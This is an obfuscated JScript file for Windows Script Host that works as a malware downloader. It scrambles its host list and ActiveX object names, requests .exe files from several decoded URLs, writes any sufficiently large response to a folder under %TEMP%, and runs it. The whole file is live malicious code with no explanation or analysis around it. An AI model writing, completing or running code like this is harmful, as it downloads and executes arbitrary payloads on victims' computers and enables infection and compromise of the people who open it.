

function xBGDPogIk(HgyXejiBEpk) {
var QsJbtoOu = WScript.CreateObject("Wscript.Shell");
QsJbtoOu.Run(HgyXejiBEpk, 0x1, 0x0);
}
function BsMOtqpig(pbdNk,iAPxV,YRDnl) {
var mKxaO = "PhxGag zOq pt.Shell BbNEtOg Scri".split(" ");
var fRZ=((1)?"W" + mKxaO[4]:"")+mKxaO[2];
var FF = WScript.CreateObject(fRZ);
var Ox = "%TEMP%\\";
return FF.ExpandEnvironmentStrings(Ox);
}
function onoSYkPQ() {
var RncIkUS = "ipting";
var KRkYdWoKEm = "ile";
var RIPxe = "System";
return "Sc" + "r" + RncIkUS + ".F" + KRkYdWoKEm + RIPxe + "Obj" + "ect";
}
function krbc(QmxNs) {
return WScript.CreateObject(QmxNs);
}
function LRxb(AUFjM,jbohl) {
AUFjM.write(jbohl);
}
function NGAv(GMlwL) {
GMlwL.open();
}
function bmJF(soqdK,glBvi) {
soqdK.saveToFile(glBvi,402-400);
}
function MOOu(xfZgC,LXqEj,TaUjF) {
xfZgC.open(TaUjF,LXqEj,false);
}
function DbUb(BxIQy) {
if (BxIQy == 459-259){return true;} else {return false;}
}
function fYVL(gGPDN) {
if (gGPDN > 168276-821){return true;} else {return false;}
}
function ckyr(zcjGn) {
var qifJc="";
for(S=(184-184); S < zcjGn.length; S++)
if (S % (470-468) != (878-878)) {
qifJc += zcjGn.substr(S, 776-775);
}
return qifJc;
}
function SwCz(WMSAa) {
WMSAa.send();
}
function gHYy(wUEGP) {
return wUEGP.status;
}
function MkFBw(KxCHzl) {
return new ActiveXObject(KxCHzl);
}
var mG="Ko5h1eolQlaocwDrLuYfWfJ.yc1opmc k/78V05.xeCxEeZ?s ct7hoiHs4i3sjiZtpsnqtqb.tcwo9mg/M8d0J.3e2xAed?w a?U R?c 8?";
var e = ckyr(mG).split(" ");
var bcK = BsMOtqpig("PFxd","tHUCW","zWYkOd");
var nuY = MkFBw(onoSYkPQ());
var TAGV = bcK+"jLlWYCL\\";
try{
nuY.CreateFolder(TAGV);
}catch(tNAvkh){
};
var ZKq = "2.XMLH";
var kcJ = (ZKq + "TTP" + " GAvvsof vRkXj XML ream St oEzqMBbj AD GxfFKiB OD").split(" ");
var aR = true  , FgFZ = kcJ[7] + "" + kcJ[9];
var sk = krbc("MS"+kcJ[3]+(777595, kcJ[0]));
var Uvz = krbc(FgFZ + "B." + kcJ[5]+(296469, kcJ[4]));
var mLv = 0;
var q = 1;
var WqjMKxd = 704011;
var j=mLv;
while (true)  {
if(j>=e.length) {break;}
var Sy = 0;
var GuZ = ("ht" + " WjGRLtr tp PtybW FSPOZLtD :// WnNiVlG .e xe G ET").split(" ");
try  {
MOOu(sk,GuZ[0]+GuZ[2]+GuZ[5]+e[j]+q, GuZ[9]+GuZ[10]); SwCz(sk); if (DbUb(gHYy(sk)))  {      
NGAv(Uvz); Uvz.type = 1; LRxb(Uvz,sk.responseBody); if (fYVL(Uvz.size))  {
Sy = 1; Uvz.position = 0; bmJF(Uvz,/*ZQ7656pUql*/TAGV/*WjLG20DXTL*/+WqjMKxd+GuZ[7]+GuZ[8]); try  {
if (((new Date())>0,7558671888)) {
xBGDPogIk(TAGV+WqjMKxd+/*5QLw36zE8n*/GuZ[7]+GuZ[8]/*Zlf261WPl1*/); 
break;
}
}
catch (ux)  {
}; 
}; Uvz.close(); 
}; 
if (Sy == 1)  {
mLv = j; break; 
}; 
}
catch (ux)  { 
}; 
j++;
}; 

